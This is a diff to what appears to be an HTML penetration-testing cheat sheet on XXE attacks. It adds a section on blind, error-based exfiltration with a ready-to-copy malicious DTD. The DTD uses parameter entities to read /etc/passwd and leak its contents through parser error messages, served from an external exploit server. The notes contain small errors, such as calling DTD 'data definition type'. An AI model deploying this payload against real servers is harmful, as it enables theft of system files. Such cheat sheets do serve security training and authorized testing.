@@ -37,7 +37,6 @@
 1. Important to inspect the requests/responses, if XML code is present there's a chance to attempt XXE.
 2. Each time you find a site to upload files and the .xml extention is allowed, XXE attempts are needed. 
 3. DTD means, data definition type.
-4. 
 
 </details>
 <details>
@@ -87,6 +86,43 @@ see if others paths provide more information.
 <summary>BLIND TECHNIQUES</summary>
 <b>:::> VIA ERROR MESSAGES </b>
 
+<b>NOTES:</b> 
+	
+- If the app is returning errors in regards XML parsing, technically that flaw can be abused to retrieve information. 
+- It helps to exfil multi-line information.
+- Sometimes it is required two entities, one to define the file to exfil and the second one to tyr to read and generate 
+the error. For that two functions are needed. <b>exfil</b> | <b>eval</b>
+- Out-of-band communications can help to discover this flaw.
+
+<b>ATTACK SAMPLE:</b>
+
+As it is a blind technique, an external exploit server to host the entities is needed. This flaw can be triggered locally, 
+however, external interaction is required.
+
+::: >> EXPLOIT SERVER HOSTING ENTITIES
+
+<b>URL:</b> <b>https://URL/exploit</b>
+
+<b>ATTACK FILE:</b> exploit.html
+
+<mark hidden id="DOCFILE01">	
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+	 HTTP/1.1 200 OK
+	 Content-Type: text/plain; charset=utf-8   
+    &lt;/head&gt;
+    &lt;body&gt;
+	TEXT
+	&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+	&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
+	%eval;
+	%exfil;
+    &lt;/body&gt;
+&lt;/html&gt;
+</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DOCFILE01')">.C0.</button>
 
 	
 </details>
